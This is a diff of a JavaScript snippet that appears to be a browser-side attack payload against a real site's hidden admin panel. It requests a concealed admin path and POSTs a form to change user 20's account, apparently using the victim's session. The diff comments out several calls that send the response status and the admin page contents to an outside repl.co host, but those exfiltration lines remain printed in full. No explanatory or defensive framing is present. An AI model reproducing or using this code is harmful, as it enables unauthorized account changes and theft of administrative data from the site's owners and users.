@@ -3,13 +3,13 @@ redirected = false;
   res = await fetch(
     "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/"
   );
-  fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
-    method: "POST",
-    body: { res: res.status },
-    headers: {
-      "Content-Type": "application/json",
-    },
-  });
+  // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+  //   method: "POST",
+  //   body: { res: res.status },
+  //   headers: {
+  //     "Content-Type": "application/json",
+  //   },
+  // });
   redirected = res.redirected;
   if (!redirected && res.status != 403) {
     formData = new FormData();
@@ -35,30 +35,30 @@ redirected = false;
       "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/20/change/",
       { method: "POST", body: formData }
     );
-    fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
-      method: "POST",
-      body: { done: "Done" },
-      headers: {
-        "Content-Type": "application/json",
-      },
-    });
+    // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+    //   method: "POST",
+    //   body: { done: "Done" },
+    //   headers: {
+    //     "Content-Type": "application/json",
+    //   },
+    // });
     if (res3.ok) {
       data3 = await res3.text();
-      fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
-        method: "POST",
-        body: JSON.stringify({ data3 }),
-        headers: {
-          "Content-Type": "application/json",
-        },
-      });
+      // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+      //   method: "POST",
+      //   body: JSON.stringify({ data3 }),
+      //   headers: {
+      //     "Content-Type": "application/json",
+      //   },
+      // });
     } else {
-      fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
-        method: "POST",
-        body: JSON.stringify({ error: res3.status }),
-        headers: {
-          "Content-Type": "application/json",
-        },
-      });
+      // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+      //   method: "POST",
+      //   body: JSON.stringify({ error: res3.status }),
+      //   headers: {
+      //     "Content-Type": "application/json",
+      //   },
+      // });
     }
   }
 })();
